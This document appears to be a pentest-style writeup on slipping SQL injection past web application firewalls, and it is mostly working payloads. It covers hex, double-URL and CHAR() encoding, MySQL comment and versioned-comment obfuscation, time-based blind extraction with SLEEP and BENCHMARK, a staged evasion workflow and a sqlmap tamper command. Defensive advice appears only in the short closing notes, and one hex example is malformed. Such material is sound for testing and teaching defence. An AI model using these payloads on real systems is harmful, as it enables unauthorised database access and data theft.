# **SQLi WAF Evasion: Advanced Techniques for Bypassing Enterprise Security**

**Web Application Firewalls (WAFs)** are widely deployed in enterprise networks to detect and block common web-based attacks such as SQL injection (SQLi). However, many WAFs still rely heavily on rule-based detection, which makes them vulnerable to **evasion through obfuscation, encoding tricks, and query manipulation**.

This writeup focuses on **real-world SQLi WAF evasion**, using:

* Alternative encoding schemes
* MySQL comment-based obfuscation
* Time-based blind SQL injection (especially in black-box testing)

We’re not dealing with lab simulations. These are **field-tested** techniques used during pentests and bug bounty assessments against hardened enterprise targets.

---

## 1. **Alternative Encoding Schemes**

WAFs commonly fail at **input normalization**, giving attackers room to deliver payloads in alternative representations that achieve the same logic while bypassing detection.

### 1.1 Hexadecimal Encoding

You can replace string literals with their hex representations to bypass signature-based filters.

**Standard:**

```sql
SELECT * FROM users WHERE username = 'admin';
```

**Hex:**

```sql
SELECT * FROM users WHERE username = 0x61646d696e;
```

**Bypassing Filters Example:**

```sql
admin' OR 1=1--
```

→ becomes:

```sql
0x61646d696e' OR 1=1--
```

This bypass works well when WAFs blacklist `'admin'` or common usernames.

---

### 1.2 URL Encoding & Double Encoding

WAFs might decode inputs once before pattern matching, but **double-encoding** can fool naive parsers.

**Original Payload:**

```
' OR 1=1--
```

**URL Encoded:**

```
%27%20OR%201%3D1--+
```

**Double Encoded (Bypass):**

```
%2527%2520OR%25201%253D1--+
```

If the WAF doesn't recursively decode, this will pass while still injecting SQL.

---

### 1.3 CHAR() Obfuscation

Another common bypass is building strings from ASCII characters.

```sql
SELECT * FROM users WHERE username = CHAR(97,100,109,105,110);
```

This is interpreted as `'admin'` but avoids directly writing the word. Combine with functions like `CONCAT()`, `CONCAT_WS()`, or even dynamic `PREPARE` statements for more complex evasion.

---

## 2. **MySQL Comment Obfuscation**

MySQL supports multiple types of comments which can be injected into queries to split keywords or confuse pattern matchers.

### 2.1 Inline Comments (`/**/`)

These can break keywords and bypass simple keyword match filters.

**Example:**

```sql
SELECT/**/1/**/FROM/**/users/**/WHERE/**/1=1;
```

**More Aggressive:**

```sql
sElEcT/**/usernAme/**/FrOm/**/users/**/wHeRe/**/1/**/=/**/1
```

Some WAFs are case-sensitive or fail to parse queries once split into non-standard casing + spacing.

---

### 2.2 MySQL Conditional Comments (`/*! */`)

These execute conditionally based on the server version — but are often ignored by WAFs that aren't aware of this syntax.

**Example:**

```sql
/*!50000SELECT*/ user FROM mysql.user;
```

Here, the query runs only if the MySQL version is 5.0 or higher (which is almost always true). WAFs that don’t parse MySQL version-specific logic won’t detect the SELECT statement.

---

### 2.3 Nested or Misused Comment Placement

Use comments to confuse syntax analyzers:

```sql
SELECT/**/user/**/FROM/**/users/**/WHERE/**/id/**/LIKE/**/'%ad%'
```

---

## 3. **Time-Based Blind SQLi**

WAFs might block reflected and error-based SQLi, but **time-based SQL injection** can fly under the radar when payloads are embedded inside functions.

This method leverages SQL’s ability to delay responses (`SLEEP`, `BENCHMARK`) to infer database behavior even when output is not visible.

### 3.1 Injection Detection via Delay

Start with a basic delay payload:

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
```

If the page takes 5+ seconds to respond, injection is confirmed.

**WAF Evasion Variants:**

```sql
%27/**/OR/**/IF(1=1,SLEEP(5),0)--+
```

```sql
' OR IF(1=1, benchmark(100000000,MD5('A')), 0)-- -
```

---

### 3.2 Extracting Data Bit-by-Bit

You can extract data by checking ASCII values character-by-character.

```sql
' OR IF(ASCII(SUBSTRING((SELECT user()),1,1)) > 80, SLEEP(5), 0)-- -
```

If the page delays, character 1’s ASCII is > 80. Binary search will extract the full value.

### 3.3 Obfuscation within Function Calls

Even functions like `CONCAT()`, `CASE`, or nested `IF()` can be abused:

```sql
' OR (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='5') THEN SLEEP(5) ELSE 0 END)-- -
```

---

## 4. **Real-World Evasion Flow (Summary)**

A good bypass strategy for hardened environments usually involves:

1. **Probing with minimal payloads**
   Start with:

   ```sql
   ' AND 1=1-- -
   ' AND 1=2-- -
   ```

2. **Applying comment obfuscation + casing**

   ```sql
   ' aNd/**/1/**/=/**/1-- -
   ```

3. **Switching to time-based payloads when output is blocked**

   ```sql
   ' OR IF(1=1,SLEEP(5),0)-- -
   ```

4. **Encoding the payload**

   * URL encode
   * Hex encode
   * CHAR() encode

5. **Using MySQL-specific constructs to avoid generic detection**

   ```sql
   /*!50000UNION*/ SELECT NULL,NULL,NULL-- -
   ```

---

## 5. **Testing and Tools**

For automation and testing, use tools like:

* `sqlmap` with tamper scripts:

  ```
  sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charunicodeencode --technique=T --dbs
  ```

* Burp Suite Intruder + Turbo Intruder for custom payloads

* Custom Python scripts using `requests` or `httpx`

---

## Final Notes

**Enterprise WAFs aren't perfect**. Many can be bypassed by using techniques that fall just outside their rule set. Most are not context-aware and fail to account for encoded or non-standard syntax variants.

That said, evasion doesn’t mean protection is worthless. It just means:

* Relying on WAF alone is negligent.
* App-layer sanitization is non-negotiable.
* Defense in depth must include parameterized queries, input validation, and proper error handling.
